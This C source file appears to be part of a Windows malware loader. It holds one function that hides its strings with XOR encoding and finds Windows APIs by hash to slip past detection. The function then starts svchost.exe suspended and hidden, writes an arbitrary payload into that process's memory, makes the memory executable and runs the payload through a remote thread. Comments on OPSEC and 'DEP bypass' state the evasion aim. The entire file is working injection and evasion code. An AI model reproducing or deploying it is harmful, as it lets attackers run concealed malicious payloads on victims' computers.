#include "config.h"
#include "injection.h"
#include "evasion.h"
#include <stdio.h>

// --- TYPEDEFS DEFINITION
typedef BOOL (WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef LPVOID (WINAPI *pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI *pWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
typedef BOOL (WINAPI *pVirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef HANDLE (WINAPI *pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef BOOL (WINAPI *pCloseHandle)(HANDLE hObject);

bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
    LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
    
    // --- ENCODED STRINGS DEFINITION
    char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
    char enc_target_process[] = { 0x1c, 0x49, 0x29, 0x27, 0x5a, 0x1d, 0x57, 0x0c, 0x05, 0x40, 0x28, 0x38, 0x4a, 0x0a, 0x2b, 0x3a, 0x1e, 0x46, 0x42, 0x6f, 0x00, 0x45, 0x00, 0x1a, 0x5c, 0x07, 0x1f, 0x1d, 0x1c, 0x27, 0x3a, 0x73, 0x75 };       // "C:\Windows\System32\svchost.exe"

    // --- API HASHES DEFINITION
    DWORD hash_CreateProc = 0xAEB52E19;     // djb2 for "CreateProcessA"
    DWORD hash_VirtAllocEx = 0xF36E5AB4;    // djb2 for "VirtualAllocEx"
    DWORD hash_WriteProcMem = 0x6F22E8C8;   // djb2 for "WriteProcessMemory"
    DWORD hash_VirtProtEx = 0xD812922A;     // djb2 for "VirtualProtectEx"
    DWORD hash_CreateRemThrd = 0xAA30775D;  // djb2 for "CreateRemoteThread"
    DWORD hash_CloseHandle = 0x3870CA07;    // djb2 for "CloseHandle"

    // --- DYNAMIC DLL LOAD

    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
    HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len); 

    if (!hKernel32) return false;

    // --- DYNAMIC API RESOLUTION VIA HASHING

    pCreateProcessA fnCreateProcessA = (pCreateProcessA) get_api_by_hash(hKernel32, hash_CreateProc);
    pVirtualAllocEx fnVirtualAllocEx = (pVirtualAllocEx) get_api_by_hash(hKernel32, hash_VirtAllocEx);
    pWriteProcessMemory fnWriteProcessMemory = (pWriteProcessMemory) get_api_by_hash(hKernel32, hash_WriteProcMem);
    pVirtualProtectEx fnVirtualProtectEx = (pVirtualProtectEx) get_api_by_hash(hKernel32, hash_VirtProtEx);
    pCreateRemoteThread fnCreateRemoteThread = (pCreateRemoteThread) get_api_by_hash(hKernel32, hash_CreateRemThrd);
    pCloseHandle fnCloseHandle = (pCloseHandle) get_api_by_hash(hKernel32, hash_CloseHandle);

    if (!fnCreateProcessA || !fnVirtualAllocEx || !fnWriteProcessMemory || !fnVirtualProtectEx || !fnCreateRemoteThread || !fnCloseHandle) return false;

    // --- TARGET PROCESS SETUP

    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    // NOTE: force GUI window to remain hidden
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = { 0 };
    
    xor_crypt(enc_target_process, sizeof(enc_target_process), cypher_key, cypher_key_len);
    
    // NOTE: use CREATE_NO_WINDOW flag to not show GUI
    // NOTE: use CREATE_SUSPENDED flag to not end process early
    bool proc_created = fnCreateProcessA(NULL, enc_target_process, NULL, NULL, FALSE, CREATE_NO_WINDOW | CREATE_SUSPENDED, NULL, NULL, &si, &pi);    
    xor_crypt(enc_target_process, sizeof(enc_target_process), cypher_key, cypher_key_len);

    if (!proc_created) return false;

    // --- MEMORY PREPARATION LOGIC (DEP BYPASS)

    // NOTE: using PAGE_READWRITE flag -> better OPSEC than PAGE_EXECUTE_READWRITE
    LPVOID remote_buffer = fnVirtualAllocEx(pi.hProcess, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!remote_buffer) {
        fnCloseHandle(pi.hProcess);
        fnCloseHandle(pi.hThread);
        return false;
    }

    // --- MEMORY WRITE LOGIC

    SIZE_T bytes_written;
    if (!fnWriteProcessMemory(pi.hProcess, remote_buffer, payload_buffer, payload_size, &bytes_written)) {
        fnCloseHandle(pi.hProcess);
        fnCloseHandle(pi.hThread);
        return false;
    }

    // change permissions to execute (DEP bypass)
    DWORD oldProtect = 0;
    if (!fnVirtualProtectEx(pi.hProcess, remote_buffer, payload_size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        fnCloseHandle(pi.hProcess);
        fnCloseHandle(pi.hThread);
        return false;
    }

    // create remote thread and stard
    HANDLE hRemoteThread = fnCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote_buffer, NULL, 0, NULL);
    
    if (!hRemoteThread) {
        fnCloseHandle(pi.hProcess);
        fnCloseHandle(pi.hThread);
        return false;
    }

    // clean handlers
    fnCloseHandle(hRemoteThread);
    fnCloseHandle(pi.hProcess);
    fnCloseHandle(pi.hThread);

    return true;
}